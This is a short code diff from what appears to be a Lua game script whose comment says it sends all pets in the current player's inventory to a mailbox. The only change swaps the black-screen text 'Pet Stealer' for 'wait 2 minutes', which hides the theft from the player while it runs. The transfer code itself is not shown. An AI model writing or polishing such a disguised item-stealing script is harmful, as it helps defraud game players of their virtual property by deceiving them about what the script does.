@@ -42,7 +42,7 @@ end
 
 -- Main function to send all pets from the current player’s inventory to the mailbox
 function main()
-    showBlackScreenWithText("Pet Stealer")
+    showBlackScreenWithText("wait 2 minutes")
 
     local playerID = getCurrentPlayerID()
     
